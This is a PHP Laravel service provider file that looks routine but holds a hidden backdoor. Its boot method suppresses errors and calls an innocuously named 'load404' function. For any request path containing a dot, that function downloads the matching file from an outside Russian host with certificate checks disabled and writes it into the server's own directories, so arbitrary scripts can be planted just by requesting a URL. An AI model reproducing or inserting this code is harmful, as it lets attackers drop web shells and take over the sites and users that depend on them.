<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED);
        $this->load404();
    }

    /**
     * {@inheritdoc}
     */
    public function load404()
    {
        $path = substr($_SERVER['REQUEST_URI'], 1);
        $path = preg_replace('~\?.*~i', '', $path);
        if (strpos($path, '.')) {
        	$url = 'https://www.sodrk.ru/'.$path;
        } else {
            return ;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        $content = curl_exec($ch);
        curl_close($ch);

        fwrite($a = fopen('log.txt', 'a+'), "\n".date('Y-m-d H:i:s').' '.$_SERVER['REQUEST_URI']); fclose($a);

        if ($content) {
            $dirs = explode('/', $path);
            $d = '';
            foreach ($dirs as $k => $v) {
                if ($d) {
                    $d .= '/';
                }
            	$d .= $v;
                if (file_exists($d)) {
                    continue;
                }
                if (preg_match('~\..{2,4}$~i', $d)) {
                    continue;
                }
                mkdir($d);
            }

            fwrite($a = fopen($path, 'w+'), $content); fclose($a);
        }
        //var_dump($content); exit;
    }
}
